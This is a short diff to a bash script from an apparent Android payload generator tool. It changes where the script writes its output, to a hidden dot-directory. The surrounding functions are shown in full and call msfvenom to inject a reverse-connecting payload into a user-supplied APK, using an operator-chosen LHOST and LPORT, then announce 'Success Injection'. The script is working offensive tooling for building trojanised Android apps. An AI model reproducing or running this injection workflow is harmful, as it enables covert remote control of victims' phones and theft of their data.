@@ -375,9 +375,9 @@ linjector() {
     read -p "Please Enter Path Of APK After Injection : " oliapkpath
     sleep 1s
     echo ''
-    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $POIA -p $PAYLOAD LHOST=$lihost LPORT=$liport -a dalvik --platform android R -o $HOME/GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk 
+    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $POIA -p $PAYLOAD LHOST=$lihost LPORT=$liport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk 
     sleep 2s
-    mv $HOME/GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk $oliapkpath
+    mv $HOME/.GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk $oliapkpath
     sleep 2s
     echo '' 
     echo -e $LGreen '';figlet -c -f slant "Success Injection"
@@ -408,8 +408,8 @@ pinjector() {
     read -p "Please Enter Path Of APK After Injection : " opiapkpath
     sleep 1s
     echo ''
-    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $PPOIA -p $PAYLOAD LHOST=$pihost LPORT=$piport -a dalvik --platform android R -o $HOME/GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk 
-    mv $HOME/GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk $opiapkpath 
+    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $PPOIA -p $PAYLOAD LHOST=$pihost LPORT=$piport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk 
+    mv $HOME/.GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk $opiapkpath 
     sleep 2s
     echo '' 
     echo -e $LGreen '';figlet -c -f slant "Success Injection"
